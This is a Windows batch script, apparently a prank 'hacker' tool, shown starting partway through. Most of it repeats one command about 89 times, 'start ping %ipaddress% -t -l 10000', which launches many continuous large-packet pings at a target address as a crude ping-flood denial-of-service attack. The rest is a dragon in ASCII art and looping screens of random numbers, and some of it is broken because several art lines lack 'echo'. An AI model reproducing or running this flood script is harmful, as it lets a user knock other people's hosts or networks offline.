start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000

set /p gitrekt=
if %gitrekt%== nooo goto delete

:dragon1
color 06
title Dragon Batch
echo DRAGON BATCH    
                 +       +                                                              
echo           +hdh+   +hdh+
echo          +hdhhhyo+shdm+s            
echo o -+o/+-hdhhyo+shdmhdyh+s                        
echo s. //.  yhyyyyyyhyhhyyyhm/`                       
echo `://`   :hyyyhhhhhhhyyyyms:                       
echo          .+/-`    `-odyymy+`                      
echo                      dyyhds+                      
echo                      +hyydhos                     
echo                       myyymh+/ `/ym:-  /+oy-      
echo                       +dyyhdh+omddhdo  .yhhdyo:   
echo                       `dyyyhhmmhyyyh-   `s  -+dh+ 
echo                        ohyyyyhmhhdmdh/-       -mhy
echo                        `dyyyyyyhhyyyhhmy:`    `dhm
echo                         ohyyyyyyyyyyyyyhmdso++ddh+
echo                         `hyyyyyyyyyyyyyyyyhhhhhh: 
echo                          `yyyhhhhhyyyhhhhhhyo/-   
echo                           -dyhs.`.yhyhs           
echo                           dNys+   sddsy` 
                                                                                 
pause >nul

:delete
color 0D
echo.
echo ok,chow!!!
echo {0A}%random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% 
goto random

:random
color 0A
echo.
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% 
goto werdy 
:werdy
color 2A
echo.
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%  %random%
goto random

:b2
echo bye
set /p b21=
if %b21%== bye goto cls
echo
echo
echo
cls

:cls
cls















